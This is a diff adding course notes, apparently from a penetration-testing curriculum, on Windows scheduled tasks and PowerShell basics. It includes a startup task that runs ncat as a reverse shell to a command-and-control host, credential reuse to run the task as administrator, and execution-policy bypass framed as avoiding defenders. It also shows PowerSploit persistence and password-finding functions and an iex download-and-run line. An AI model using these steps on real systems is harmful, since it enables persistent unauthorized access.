@@ -1071,4 +1071,653 @@ ExitCode  Name                                      ProcessId  StartMode  State 
 0         CryptSvc                                  2844       Auto       Running  OK
 <SNIP>
 ```
+## Schedueled tasks
 
+#### Query Syntax
+|Action | Parameter | Description|
+|-------|-----------|------------|
+|`Query` | | Performs a local or remote host search to determine what scheduled tasks exist. Due to permissions, not all tasks may be seen by a normal user.|
+| |	`/fo` | Sets formatting options. We can specify to show results in the `Table`, `List`, or `CSV` output.|
+| |	`/v` | Sets verbosity to on, displaying the `advanced properties` set in displayed tasks when used with the List or CSV output parameter.|
+| |	`/nh` | Simplifies the output using the Table or CSV output format. This switch `removes` the `column headers`.|
+| |	`/s` | Sets the DNS name or IP address of the host we want to connect to. `Localhost` is the `default` specified. If `/s` is utilized, we are connecting to a remote host and must format it as "\\host".|
+| |	`/u` | This switch will tell schtasks to run the following command with the `permission set` of the `user` specified.|
+| |	`/p` | Sets the `password` in use for command execution when we specify a user to run the task. Users must be members of the Administrator's group on the host (or in the domain). The `u` and `p` values are only valid when used with the `s` parameter.|
+|
+
+We can view the tasks that already exist on our host by utilizing the schtasks command like so:
+```
+C:\htb> SCHTASKS /Query /V /FO list
+
+Folder: \  
+HostName:                             DESKTOP-Victim
+TaskName:                             \Check Network Access
+Next Run Time:                        N/A
+Status:                               Ready
+Logon Mode:                           Interactive only
+Last Run Time:                        11/30/1999 12:00:00 AM
+Last Result:                          267011
+Author:                               DESKTOP-Victim\htb-admin
+Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
+Start In:                             N/A
+Comment:                              quick ping check to determine connectivity. If it passes, other tasks will kick off. If it fails, they will delay.
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode, No Start On Batteries
+Run As User:                          tru7h
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        At system start up
+Start Time:                           N/A
+Start Date:                           N/A
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Repeat: Every:                        N/A
+Repeat: Until: Time:                  N/A
+Repeat: Until: Duration:              N/A
+Repeat: Stop If Still Running:        N/A
+
+<SNIP>
+```
+
+#### Create a new scheduled Task
+
+|Action |Parameter |Description|
+|-------|----------|-----------|
+|`Create` ||Schedules a task to run.|
+||`/sc` |Sets the schedule type. It can be by the minute, hourly, weekly, and much more. Be sure to check the options parameters.|
+||`/tn` |Sets the name for the task we are building. Each task must have a unique name.|
+||`/tr` |Sets the trigger and task that should be run. This can be an executable, script, or batch file.|
+||`/s` |Specify the host to run on, much like in Query.|
+||`/u` |Specifies the local user or domain user to utilize|
+||`/p` |Sets the Password of the user-specified.|
+||`/mo` |Allows us to set a modifier to run within our set schedule. For example, every 5 hours every other day.|
+||`/rl` |Allows us to limit the privileges of the task. Options here are `limited` access and `Highest`. `Limited` is the default value.|
+||`/z` |Will set the task to be deleted after completion of its actions.|
+
+At minimum we must specify:
+
+- /create : to tell it what we are doing
+- /sc : we must set a schedule
+- /tn : we must set the name
+- /tr : we must give it an action to take
+
+#### New Task Creation example
+
+```
+C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"
+
+SUCCESS: The scheduled task "My Secret Task" has successfully been created.
+```
+
+Start a remote shell on each startup to ensure we always have access if host is up. In this can it will connect to out command and control framework (Metasploit, Empire, etc.) and give us shell access.
+
+####Change Syntax
+
+|Action |Parameter |Description|
+|----- |----- |-----|
+|Change ||Allows for modifying existing scheduled tasks.|
+||/tn |Designates the task to change|
+||/tr |Modifies the program or action that the task runs.|
+||/ENABLE |Change the state of the task to Enabled.|
+||/DISABLE |Change the state of the task to Disabled.|
+
+Say we found the has of the local admin password and we want to spawn our Ncat shell. If anything happens, we can modify the task like so to add in the credentials for it to use.
+
+```
+C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
+
+SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
+
+
+C:\htb> schtasks /query /tn "My Secret Task" /V /fo list 
+
+Folder: \
+HostName:                             DESKTOP-Victim
+TaskName:                             \My Secret Task
+Next Run Time:                        N/A
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        11/30/1999 12:00:00 AM
+Last Result:                          267011
+Author:                               DESKTOP-victim\htb-admin
+Task To Run:                          C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100
+Start In:                             N/A
+Comment:                              N/A
+Scheduled Task State:                 Enabled
+Idle Time:                            Disabled
+Power Management:                     Stop On Battery Mode, No Start On Batteries
+Run As User:                          SYSTEM
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 72:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        At system start up
+
+<SNIP>  
+```
+
+#### Delete the Scheduled task
+
+|Action |Parameter |Description|
+|-------|----------|-----------|
+|Delete ||Remove a task from the schedule|
+||/tn |Identifies the task to delete.|
+||/s |Specifies the name or IP address to delete the task from.|
+||/u |Specifies the user to run the task as.|
+||/p |Specifies the password to run the task as.|
+||/f |Stops the confirmation warning.|
+
+```
+C:\htb> schtasks /delete  /tn "My Secret Task" 
+
+WARNING: Are you sure you want to remove the task "My Secret Task" (Y/N)?
+```
+
+# PowerShell
+
+## CMD vs PowerShell
+
+|Feature |CMD |PowerShell|
+|--------|----|----------|
+|Language |Batch and basic CMD commands only. |PowerShell can interpret Batch, CMD, PS cmdlets, and aliases.|
+|Command utilization |The output from one command cannot be passed into another directly as a structured object, due to the limitation of handling the text output. |The output from one command can be passed into another directly as a structured object resulting in more sophisticated commands.|
+|Command Output |Text only. |PowerShell outputs in object formatting.|
+|Parallel Execution |CMD must finish one command before running another. |PowerShell can multi-thread commands to run in parallel.|
+
+[PowerShell](https://learn.microsoft.com/en-us/powershell/) has become increasingly prominent among IT and Infosec professionals. It has widespread utility for System Administrators, Penetration Testers, SOC Analysts, and many other technical disciplines where ever Windows systems are administered. Consider IT admins and Windows system administrators administering IT environments made up of Windows servers, desktops (Windows 10 & 11), Azure, and Microsoft 365 cloud-based applications. Many of them are using PowerShell to automate tasks they must accomplish daily. Among some of these tasks are:
+
+- Provisioning servers and installing server roles
+- Creating Active Directory user accounts for new employees
+- Managing Active Directory group permissions
+- Disabling and deleting Active Directory user accounts
+- Managing file share permissions
+- Interacting with Azure AD and Azure VMs
+- Creating, deleting, and monitoring directories & files
+- Gathering information about workstations and servers
+- Setting up Microsoft Exchange email inboxes for users (in the cloud &/or on-premises)
+
+You can open powershell with the applications
+ - Windows PowerShell
+ - Windows Terminal
+ - Windows Powershell ISE (Powershell IDE)
+ - cmd, the typing the `powershell` command
+
+Get help with [Get-Help](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-help?view=powershell-7.5&viewFallbackFrom=powershell-7.2):
+```PowerShell
+PS C:\Users\htb-student> Get-Help Test-Wsman
+
+NAME
+    Test-WSMan
+
+SYNTAX
+    Test-WSMan [[-ComputerName] <string>] [-Authentication {None | Default | Digest | Negotiate | Basic | Kerberos |
+    ClientCertificate | Credssp}] [-Port <int>] [-UseSSL] [-ApplicationName <string>] [-Credential <pscredential>]
+    [-CertificateThumbprint <string>]  [<CommonParameters>]
+
+
+ALIASES
+    None
+
+
+REMARKS
+    Get-Help cannot find the Help files for this cmdlet on this computer. It is displaying only partial help.
+        -- To download and install Help files for the module that includes this cmdlet, use Update-Help.
+        -- To view the Help topic for this cmdlet online, type: "Get-Help Test-WSMan -Online" or
+           go to https://go.microsoft.com/fwlink/?LinkId=141464.
+```
+
+Notice the `-online` command. You can use this to get the oneline documentation of a command with say `Get-Help Test-Wsman -online` for the Test-WSMan microsoft documentation.
+
+We can also use a helpful cmdlet called [Update-Help](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/update-help?view=powershell-7.2) to ensure we have the most up-to-date information for each cmdlet on the Windows system.
+
+### Getting Around in PowerShell
+
+(PS stands for PowerShell.)
+```PowerShell
+# Where are we
+PS C:\Users\DLarusso> Get-Location
+
+Path
+----
+C:\Users\DLarusso
+
+
+#List directory contents
+PS C:\htb> Get-ChildItem 
+
+Directory: C:\Users\DLarusso
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----        10/26/2021  10:26 PM                .ssh
+d-----         1/28/2021   7:05 PM                .vscode
+d-r---         1/27/2021   2:44 PM                3D Objects
+d-r---         1/27/2021   2:44 PM                Contacts
+d-r---         9/18/2022  12:35 PM                Desktop
+d-r---         9/18/2022   1:01 PM                Documents
+d-r---         9/26/2022  12:27 PM                Downloads
+d-r---         1/27/2021   2:44 PM                Favorites
+d-r---         1/27/2021   2:44 PM                Music
+dar--l         9/26/2022  12:03 PM                OneDrive
+d-r---         5/22/2022   2:00 PM                Pictures
+
+
+# Move to a directory (can be done with relative or absolute path)
+PS C:\htb>  Set-Location .\Documents\
+
+PS C:\Users\tru7h\Documents> Get-Location
+
+Path
+----
+C:\Users\DLarusso\Documents
+
+
+# Display file contents
+PS C:\htb> Get-Content Readme.md  
+
+# ![logo][] PowerShell
+
+Welcome to the PowerShell GitHub Community!
+PowerShell Core is a cross-platform (Windows, Linux, and macOS) automation and configuration tool/framework that works well with your existing tools and is optimized
+for dealing with structured data (e.g., JSON, CSV, XML, etc.), REST APIs, and object models.
+It includes a command-line shell, an associated scripting language and a framework for processing cmdlets. 
+
+<SNIP> 
+```
+
+### Tips & Tricks for PowerShell Usage
+
+```PowerShell
+# list available commands
+PS C:\htb> Get-Command
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Alias           Add-AppPackage                                     2.0.1.0    Appx
+Alias           Add-AppPackageVolume                               2.0.1.0    Appx
+Alias           Add-AppProvisionedPackage                          3.0        Dism
+Alias           Add-ProvisionedAppPackage                          3.0        Dism
+Alias           Add-ProvisionedAppxPackage                         3.0        Dism
+Alias           Add-ProvisioningPackage                            3.0        Provisioning
+Alias           Add-TrustedProvisioningCertificate                 3.0        Provisioning
+Alias           Apply-WindowsUnattend                              3.0        Dism
+Alias           Disable-PhysicalDiskIndication                     2.0.0.0    Storage
+Alias           Disable-StorageDiagnosticLog                       2.0.0.0    Storage
+Alias           Dismount-AppPackageVolume                          2.0.1.0    Appx
+Alias           Enable-PhysicalDiskIndication                      2.0.0.0    Storage
+Alias           Enable-StorageDiagnosticLog                        2.0.0.0    Storage
+Alias           Flush-Volume                                       2.0.0.0    Storage
+Alias           Get-AppPackage                                     2.0.1.0    Appx
+
+<SNIP>  
+
+# using the ver-noun convention, we can search for either, eg:
+PS C:\htb> Get-Command -verb get
+
+<SNIP>
+Cmdlet          Get-Acl                                            3.0.0.0    Microsoft.Pow...
+Cmdlet          Get-Alias                                          3.1.0.0    Microsoft.Pow...
+Cmdlet          Get-AppLockerFileInformation                       2.0.0.0    AppLocker
+Cmdlet          Get-AppLockerPolicy                                2.0.0.0    AppLocker
+Cmdlet          Get-AppvClientApplication                          1.0.0.0    AppvClient  
+<SNIP>  
+
+PS C:\htb> Get-Command -noun windows*  
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Alias           Apply-WindowsUnattend                              3.0        Dism
+Function        Get-WindowsUpdateLog                               1.0.0.0    WindowsUpdate
+Cmdlet          Add-WindowsCapability                              3.0        Dism
+Cmdlet          Add-WindowsDriver                                  3.0        Dism
+Cmdlet          Add-WindowsImage                                   3.0        Dism
+Cmdlet          Add-WindowsPackage                                 3.0        Dism
+Cmdlet          Clear-WindowsCorruptMountPoint                     3.0        Dism
+Cmdlet          Disable-WindowsErrorReporting                      1.0        WindowsErrorR...
+Cmdlet          Disable-WindowsOptionalFeature                     3.0        Dism
+Cmdlet          Dismount-WindowsImage                              3.0        Dism
+Cmdlet          Enable-WindowsErrorReporting                       1.0        WindowsErrorR...
+Cmdlet          Enable-WindowsOptionalFeature                      3.0        Dism
+
+# History
+# By default, PowerShell keeps the last 4096 commands entered, but this setting can be modified by changing the $MaximumHistoryCount variable.
+# By default, Get-History will only show the commands that have been run during this active session
+PS C:\htb> Get-History
+
+ Id CommandLine
+  -- -----------
+   1 Get-Command
+   2 clear
+   3 get-command -verb set
+   4 get-command set*
+   5 clear
+   6 get-command -verb get
+   7 get-command -noun windows
+   8 get-command -noun windows*
+   9 get-module
+  10 clear
+  11 get-history
+  12 clear
+  13 ipconfig /all
+  14 arp -a
+  15 get-help
+  16 get-help get-module
+
+
+#read from PSReadline to get full history
+PS C:\htb> get-content C:\Users\DLarusso\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+get-module
+Get-ChildItem Env: | ft Key,Value
+Get-ExecutionPolicy
+clear
+ssh administrator@10.172.16.110.55
+powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://download.sysinternals.com/files/PSTools.zip')"
+Get-ExecutionPolicy
+
+<SNIP>
+# One great feature of PSReadline from an admin perspective is that it will automatically attempt to filter any entries that include the strings: password, asplaintext, token, apikey, secret.
+
+
+# Clear screen
+Clear-Host
+clear
+cls
+
+# Show command alias
+PS C:\Windows\system32> Get-Alias
+
+CommandType     Name                                               Version    Source
+                                                                              
+-----------     ----                                               -------    -----
+Alias           % -> ForEach-Object
+Alias           ? -> Where-Object
+Alias           ac -> Add-Content
+Alias           asnp -> Add-PSSnapin
+Alias           cat -> Get-Content
+Alias           cd -> Set-Location
+Alias           CFS -> ConvertFrom-String                          3.1.0.0    Mi...
+Alias           chdir -> Set-Location
+Alias           clc -> Clear-Content
+Alias           clear -> Clear-Host
+Alias           clhy -> Clear-History
+Alias           cli -> Clear-Item
+Alias           clp -> Clear-ItemProperty
+Alias           cls -> Clear-Host
+Alias           clv -> Clear-Variable
+Alias           cnsn -> Connect-PSSession
+Alias           compare -> Compare-Object
+Alias           copy -> Copy-Item
+Alias           cp -> Copy-Item
+Alias           cpi -> Copy-Item
+Alias           cpp -> Copy-ItemProperty
+Alias           curl -> Invoke-WebRequest
+Alias           cvpa -> Convert-Path
+Alias           dbp -> Disable-PSBreakpoint
+Alias           del -> Remove-Item
+Alias           diff -> Compare-Object
+Alias           dir -> Get-ChildItem
+
+<SNIP>
+
+# Create Alias
+PS C:\Windows\system32> Set-Alias -Name gh -Value Get-Help
+```
+
+### Helpful alias
+
+|Alias |Description|
+|------|------------|
+|pwd |gl can also be used. This alias can be used in place of Get-Location.|
+|ls |dir and gci can also be used in place of ls. This is an alias for Get-ChildItem.|
+|cd |sl and chdir can be used in place of cd. This is an alias for Set-Location.|
+|cat |type and gc can also be used. This is an alias for Get-Content.|
+|clear |Can be used in place of Clear-Host.|
+|curl |Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used.|
+|fl and ft |These aliases can be used to format output into list and table outputs.|
+|man |Can be used in place of help.|
+| ?  | Where-Object|
+| %  | ForEach-Object |
+
+### Hotkeys
+
+|HotKey |Description|
+|-------|-----------|
+|CTRL+R |It makes for a searchable history. We can start typing after, and it will show us results that match previous commands.|
+|CTRL+L |Quick screen clear.|
+|CTRL+ALT+Shift+? |This will print the entire list of keyboard shortcuts PowerShell will recognize.|
+|Escape |When typing into the CLI, if you wish to clear the entire line, instead of holding backspace, you can just hit escape, which will erase the line.|
+|↑ |Scroll up through our previous history.|
+|↓ |Scroll down through our previous history.|
+|F7 |Brings up a TUI with a scrollable interactive history from our session.|
+
+
+## All About Cmdlets and Modules
+
+#### Cmdlets
+
+A [cmdlet](https://learn.microsoft.com/en-us/powershell/scripting/lang-spec/chapter-13?view=powershell-7.5&viewFallbackFrom=powershell-7.2) as defined by Microsoft is:
+
+"`a single-feature command that manipulates objects in PowerShell.`"
+
+Cmdlets follow a Verb-Noun structure which often makes it easier for us to understand what any given cmdlet does. With Test-WSMan, we can see the verb is Test and the Noun is Wsman.
+
+### PowerShell modules
+
+A [PowerShell module](https://docs.microsoft.com/en-us/powershell/scripting/developer/module/understanding-a-windows-powershell-module?view=powershell-7.2) is structured PowerShell code that is made easy to use & share. As mentioned in the official Microsoft docs, a module can be made up of the following:
+- Cmdlets
+- Script files
+- Functions
+- Assemblies
+- Related resources (manifests and help files)
+
+Through this section, we are going to use the PowerView project to examine what makes up a module and how to interact with them. `PowerView.ps1` is part of a collection of PowerShell modules organized in a project called [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) created by the [PowerShellMafia](https://github.com/PowerShellMafia/PowerSploit) to provide penetration testers with many valuable tools to use when testing Windows Domain/Active Directory environments.
+
+### Using PowerShell modules
+
+```PowerShell
+PS C:\htb> Get-Module 
+
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Script     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}
+Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Con...
+Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}
+Script     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expan...
+Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...
+
+
+PS C:\htb> Get-Module -ListAvailable 
+
+ Directory: C:\Users\tru7h\Documents\WindowsPowerShell\Modules
+
+
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Script     1.1.0      PSSQLite                            {Invoke-SqliteBulkCopy, Invoke-SqliteQuery, New-SqliteConn...
+
+
+    Directory: C:\Program Files\WindowsPowerShell\Modules
+
+
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Script     1.0.1      Microsoft.PowerShell.Operation.V... {Get-OperationValidation, Invoke-OperationValidation}
+Binary     1.0.0.1    PackageManagement                   {Find-Package, Get-Package, Get-PackageProvider, Get-Packa...
+Script     3.4.0      Pester                              {Describe, Context, It, Should...}
+Script     1.0.0.1    PowerShellGet                       {Install-Module, Find-Module, Save-Module, Update-Module...}
+Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Set-PSReadLineKeyHandler, Remov...
+
+# Look at Import-Module for how to load a module
+PS C:\Users\htb-student> Get-Help Import-Module
+
+NAME
+    Import-Module
+
+SYNOPSIS
+    Adds modules to the current session.
+
+
+SYNTAX
+    Import-Module [-Assembly] <System.Reflection.Assembly[]> [-Alias <System.String[]>] [-ArgumentList
+    <System.Object[]>] [-AsCustomObject] [-Cmdlet <System.String[]>] [-DisableNameChecking] [-Force] [-Function
+    <System.String[]>] [-Global] [-NoClobber] [-PassThru] [-Prefix <System.String>] [-Scope {Local | Global}]
+    [-Variable <System.String[]>] [<CommonParameters>]
+
+    Import-Module [-Name] <System.String[]> [-Alias <System.String[]>] [-ArgumentList <System.Object[]>]
+    [-AsCustomObject] [-CimNamespace <System.String>] [-CimResourceUri <System.Uri>] -CimSession
+    <Microsoft.Management.Infrastructure.CimSession> [-Cmdlet <System.String[]>] [-DisableNameChecking] [-Force]
+    [-Function <System.String[]>] [-Global] [-MaximumVersion <System.String>] [-MinimumVersion <System.Version>]
+    [-NoClobber] [-PassThru] [-Prefix <System.String>] [-RequiredVersion <System.Version>] [-Scope {Local | Global}]
+    [-Variable <System.String[]>] [<CommonParameters>]
+
+<SNIP>
+
+# Let's import the powersploit module to get the `Get-NetLocalgroup` cmdlet
+PS C:\Users\htb-student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1
+PS C:\Users\htb-student\Desktop\PowerSploit> Get-NetLocalgroup
+
+ComputerName GroupName                           Comment
+------------ ---------                           -------
+WS01         Access Control Assistance Operators Members of this group can remotely query authorization attributes a...
+WS01         Administrators                      Administrators have complete and unrestricted access to the compute...
+WS01         Backup Operators                    Backup Operators can override security restrictions for the sole pu...
+WS01         Cryptographic Operators             Members are authorized to perform cryptographic operations.
+WS01         Distributed COM Users               Members are allowed to launch, activate and use Distributed COM obj...
+WS01         Event Log Readers                   Members of this group can read event logs from local machine
+WS01         Guests                              Guests have the same access as members of the Users group by defaul...
+WS01         Hyper-V Administrators              Members of this group have complete and unrestricted access to all ...
+WS01         IIS_IUSRS                           Built-in group used by Internet Information Services.
+WS01         Network Configuration Operators     Members in this group can have some administrative privileges to ma...
+WS01         Performance Log Users               Members of this group may schedule logging of performance counters,...
+WS01         Performance Monitor Users           Members of this group can access performance counter data locally a...
+WS01         Power Users                         Power Users are included for backwards compatibility and possess li...
+WS01         Remote Desktop Users                Members in this group are granted the right to logon remotely
+WS01         Remote Management Users             Members of this group can access WMI resources over management prot...
+WS01         Replicator                          Supports file replication in a domain
+WS01         System Managed Accounts Group       Members of this group are managed by the system.
+WS01         Users                               Users are prevented from making accidental or intentional system-wi...
+
+
+# if we have trouble with loading module (ie non imported ones) we can check our PSModulePath to check that it is indeed present
+PS C:\Users\htb-student> $env:PSModulePath
+
+C:\Users\htb-student\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+```
+
+### Execution Policy
+
+An essential factor to consider when attempting to use PowerShell scripts and modules is [PowerShell's execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2). As outlined in Microsoft's official documentation, an execution policy is not a security control. It is designed to give IT admins a tool to set parameters and safeguards for themselves.
+
+```PowerShell
+PS C:\Users\htb-student\Desktop\PowerSploit> Import-Module .\PowerSploit.psd1
+
+Import-Module : File C:\Users\Users\htb-student\PowerSploit.psm1
+cannot be loaded because running scripts is disabled on this system. For more information, see
+about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
+At line:1 char:1
++ Import-Module .\PowerSploit.psd1
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
+
+# Check Execution Policy
+PS C:\htb> Get-ExecutionPolicy 
+
+Restricted  
+
+# Changin execution policy
+PS C:\htb> Set-ExecutionPolicy undefined 
+
+# testing it out
+PS C:\htb> Import-Module .\PowerSploit.psd1
+
+Import-Module .\PowerSploit.psd1
+PS C:\Users\htb> get-module
+
+ModuleType Version    Name                                ExportedCommands
+---------- -------    ----                                ----------------
+Manifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Check...
+Manifest   3.0.0.0    Microsoft.PowerShell.Security       {ConvertFrom-SecureString, Conver...
+Manifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Vari...
+Script     3.0.0.0    PowerSploit                         {Add-Persistence, Add-ServiceDacl...
+Script     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PS...
+```
+
+Note: As a sysadmin, these kinds of changes are common and should always be reverted once we are done with work. As a pentester, us making a change like this and not reverting it could indicate to a defender that the host has been compromised. Be sure to check that we clean up after our actions. Another way we can bypass the execution policy and not leave a persistent change is to change it at the process level using `-scope`.
+
+```PowerShell
+# Changing execution policy by scope
+PS C:\htb> Set-ExecutionPolicy -scope Process 
+PS C:\htb> Get-ExecutionPolicy -list
+
+Scope ExecutionPolicy
+        ----- ---------------
+MachinePolicy       Undefined
+   UserPolicy       Undefined
+      Process          Bypass
+  CurrentUser       Undefined
+ LocalMachine          Bypass  
+```
+
+By changing it at the Process level, our change will revert once we close the PowerShell session. More detail in this [blog post](https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/).
+
+### Calling Cmdlets from within a module
+
+```PowerShell
+# list available aliases, commands, and functions an imported module brough to a session: Get-Command -Module <modulename>
+PS C:\htb> Get-Command -Module PowerSploit
+
+CommandType     Name                                               Version    Source
+-----------     ----                                               -------    ------
+Alias           Invoke-ProcessHunter                               3.0.0.0    PowerSploit
+Alias           Invoke-ShareFinder                                 3.0.0.0    PowerSploit
+Alias           Invoke-ThreadedFunction                            3.0.0.0    PowerSploit
+Alias           Invoke-UserHunter                                  3.0.0.0    PowerSploit
+Alias           Request-SPNTicket                                  3.0.0.0    PowerSploit
+Alias           Set-ADObject                                       3.0.0.0    PowerSploit
+Function        Add-Persistence                                    3.0.0.0    PowerSploit
+Function        Add-ServiceDacl                                    3.0.0.0    PowerSploit
+Function        Find-AVSignature                                   3.0.0.0    PowerSploit
+Function        Find-InterestingFile                               3.0.0.0    PowerSploit
+Function        Find-LocalAdminAccess                              3.0.0.0    PowerSploit
+Function        Find-PathDLLHijack                                 3.0.0.0    PowerSploit
+Function        Find-ProcessDLLHijack                              3.0.0.0    PowerSploit
+Function        Get-ApplicationHost                                3.0.0.0    PowerSploit
+Function        Get-GPPPassword                                    3.0.0.0    PowerSploit
+```
+
+Use the [PowerShel Gallery](https://www.powershellgallery.com/) to learn of many different types of modules. From simple Cmdlets for user attributes to solving complex cloud storage issues.
+
+Say we want to explore the `Find-Module` function from the `PowerShellGet` module to get the [`AdminToolbox`](https://www.powershellgallery.com/packages/AdminToolbox/11.0.8) module for ActiveDirectory Management.
+
+```PowerShell
+PS C:\htb> Find-Module -Name AdminToolbox 
+
+Version    Name                                Repository           Description
+-------    ----                                ----------           -----------
+11.0.8     AdminToolbox                        PSGallery            Master module for a col...
+
+PS C:\htb> find-module -Name AdminToolbox | Install-Module
+```
+
+This will download the module from `powershellgallery.com`.
+
+### Tools To Be Aware Of
+
+Below we will quickly list a few PowerShell modules and projects we, as penetration testers and sysadmins, should be aware of. Each of these tools brings a new capability to use within PowerShell. Of course, there are plenty more than just our list; these are just several we find ourselves returning to on every engagement.
+
+- [AdminToolbox](https://www.powershellgallery.com/packages/AdminToolbox/11.0.8): AdminToolbox is a collection of helpful modules that allow system administrators to perform any number of actions dealing with things like Active Directory, Exchange, Network management, file and storage issues, and more.
+
+- [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps): This module is a collection of local and remote administration tools for all things Active Directory. We can manage users, groups, permissions, and much more with it.
+
+- [Empire / Situational Awareness](https://github.com/BC-SECURITY/Empire/tree/master/empire/server/data/module_source/situational_awareness): Is a collection of PowerShell modules and scripts that can provide us with situational awareness on a host and the domain they are apart of. This project is being maintained by BC Security as a part of their Empire Framework.
+
+- [Inveigh](https://github.com/Kevin-Robertson/Inveigh): Inveigh is a tool built to perform network spoofing and Man-in-the-middle attacks.
+
+- [BloodHound / SharpHound](https://github.com/SpecterOps/BloodHound-Legacy/tree/master/Collectors): Bloodhound/Sharphound allows us to visually map out an Active Directory Environment using graphical analysis tools and data collectors written in C# and PowerShell.
+
+## User and Group management
